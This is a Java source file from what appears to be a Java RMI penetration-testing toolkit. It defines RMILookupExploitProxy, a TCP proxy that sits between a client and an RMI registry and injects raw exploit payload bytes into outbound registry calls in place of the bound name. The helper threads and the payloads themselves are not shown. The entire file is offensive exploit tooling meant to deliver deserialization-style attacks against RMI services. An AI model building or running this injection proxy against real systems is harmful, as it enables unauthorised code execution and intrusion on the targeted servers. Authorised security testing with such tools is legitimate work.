package proxy;

import proxy.thread.PassThroughProxyThread;
import payloads.thread.LookupPayloadInjectingProxyThread;

import java.net.InetAddress;
import java.net.Socket;

/***********************************************************
 * TCP proxy server used to inject exploit payloads into
 * outbound calls to Registry.bind().
 * 
 * Exploit payloads are injected in place of the string
 * which the given object is bound to.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class RMILookupExploitProxy extends ProxyServer {
	/*******************
	 * Properties
	 ******************/
	private final byte[] _payload;	//The raw bytes of the payload to inject

	/*******************
	 * Construct the proxy.
	 *
	 * @param targetHost The host to forward connections to.
	 * @param targetPort The port to forward connections to.
	 * @param payload The exploit payload to inject.
	 ******************/
	public RMILookupExploitProxy(InetAddress targetHost, int targetPort, byte[] payload) {
		//Initialise super class
		super(targetHost, targetPort);
		
		//Store the exploit payload
		this._payload = payload;
	}
	
	/*******************
	 * Create a proxy session object that injects the payload into the RMI
	 * bind() call and allows returned data to pass through.
	 * 
	 * @param clientSock A Socket for the incoming client connection.
	 * @param targetSock A Socket connected to the proxy target.
	 * @return A ProxySession object to handle the connection and data transfer.
	 ******************/
	protected ProxySession createProxySession(Socket clientSock, Socket targetSock) {
		return new ProxySession(
				new LookupPayloadInjectingProxyThread(clientSock, targetSock, this._payload),
				new PassThroughProxyThread(targetSock, clientSock)
		);
	}
}
